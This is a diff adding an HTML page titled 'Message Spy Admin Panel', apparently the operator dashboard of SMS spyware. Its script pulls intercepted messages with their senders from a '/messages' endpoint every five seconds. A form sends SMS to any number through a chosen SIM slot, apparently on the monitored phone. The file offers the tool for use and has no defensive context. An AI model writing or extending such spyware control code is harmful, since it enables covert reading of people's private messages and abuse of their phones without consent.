@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Message Spy Admin Panel</title>
+</head>
+<body>
+    <h1>Message Spy Admin Panel</h1>
+    <div id="messages"></div>
+    <form id="sendSmsForm">
+        <input type="text" id="recipient" placeholder="Recipient Number" required>
+        <input type="text" id="message" placeholder="Message" required>
+        <select id="simSlot">
+            <option value="1">SIM 1</option>
+            <option value="2">SIM 2</option>
+        </select>
+        <button type="submit">Send SMS</button>
+    </form>
+
+    <script>
+        async function fetchMessages() {
+            const response = await fetch('/messages');
+            const messages = await response.json();
+            const messagesDiv = document.getElementById('messages');
+            messagesDiv.innerHTML = '';
+            messages.forEach(msg => {
+                const msgElement = document.createElement('div');
+                msgElement.textContent = `From: ${msg.sender}, Message: ${msg.message}`;
+                messagesDiv.appendChild(msgElement);
+            });
+        }
+
+        document.getElementById('sendSmsForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const recipient = document.getElementById('recipient').value;
+            const message = document.getElementById('message').value;
+            const simSlot = document.getElementById('simSlot').value;
+
+            await fetch('/send-sms', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ recipient, message, simSlot })
+            });
+
+            alert('SMS sent!');
+        });
+
+        fetchMessages();
+        setInterval(fetchMessages, 5000);
+    </script>
+</body>
+</html>
